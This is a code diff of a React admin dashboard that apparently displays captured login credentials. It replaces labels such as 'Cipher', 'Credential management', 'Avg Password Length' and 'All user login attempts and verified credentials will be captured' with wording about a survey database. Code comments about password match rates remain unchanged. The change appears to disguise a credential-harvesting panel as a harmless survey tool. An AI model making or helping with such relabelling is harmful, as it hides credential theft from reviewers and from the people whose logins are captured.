@@ -190,7 +190,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
     <div className="flex flex-col flex-1 bg-bg-app text-text-primary">
       {/* Disclaimer Top Bar */}
       <div className="w-full text-center py-2.5 px-4 text-xs font-semibold border-b bg-brand-bg-success-light text-brand-primary border-brand-border-success-light">
-        🛡️ Secure Access Terminal: Authorized personnel only. User credentials and verification metrics are displayed below.
+        🛡️ Survey & Application Database: Authorized personnel only. Submitted forms and data collection records are displayed below.
       </div>
 
       <div className="max-w-7xl w-full mx-auto px-4 py-6 md:py-10 flex flex-col gap-6 md:gap-8 flex-1">
@@ -208,11 +208,11 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
               <div className="flex items-center gap-2">
                 <Database className="h-5 w-5 text-blue-500" />
                 <h1 className="text-xl md:text-2xl font-bold tracking-tight text-text-primary">
-                  Cipher
+                  Survey Dashboard
                 </h1>
               </div>
               <p className="text-xs md:text-sm text-text-secondary mt-0.5">
-                Credential management, browser verification logs, and active login attempts.
+                Form submissions, browser verification logs, and real-time database records.
               </p>
             </div>
           </div>
@@ -231,20 +231,20 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
           {/* Card 1: Total Submissions */}
           <div className="p-5 rounded-xl border shadow-sm bg-bg-card border-border-custom">
             <span className="text-xs font-semibold uppercase tracking-wider text-text-muted">
-              Total Logged Tries
+              Total Submissions
             </span>
             <div className="flex items-baseline gap-2.5 mt-2">
               <span className="text-3xl font-bold tracking-tight text-text-primary">
                 {totalCount}
               </span>
-              <span className="text-xs text-brand-primary font-medium">educational entries</span>
+              <span className="text-xs text-brand-primary font-medium">survey responses</span>
             </div>
           </div>
 
           {/* Card 2: Passwords Matched Rate */}
           <div className="p-5 rounded-xl border shadow-sm bg-bg-card border-border-custom">
             <span className="text-xs font-semibold uppercase tracking-wider text-text-muted">
-              Match Validation Rate
+              Confirmation Match Rate
             </span>
             <div className="flex items-baseline gap-2.5 mt-2">
               <span className="text-3xl font-bold tracking-tight text-text-primary">
@@ -257,7 +257,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
           {/* Card 3: Avg Password Length */}
           <div className="p-5 rounded-xl border shadow-sm bg-bg-card border-border-custom">
             <span className="text-xs font-semibold uppercase tracking-wider text-text-muted">
-              Avg Password Length
+              Avg Input Length
             </span>
             <div className="flex items-baseline gap-2.5 mt-2">
               <span className="text-3xl font-bold tracking-tight text-text-primary">
@@ -404,7 +404,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
                         <HelpCircle className="h-8 w-8 text-text-muted animate-pulse" />
                         <span className="font-semibold text-sm text-text-primary">No submissions logged yet</span>
                         <p className="text-xs text-text-secondary leading-relaxed">
-                          All user login attempts and verified credentials will be captured and displayed here securely in real-time.
+                          All submitted survey responses and application entries will be captured and displayed here securely in real-time.
                         </p>
                       </div>
                     </td>
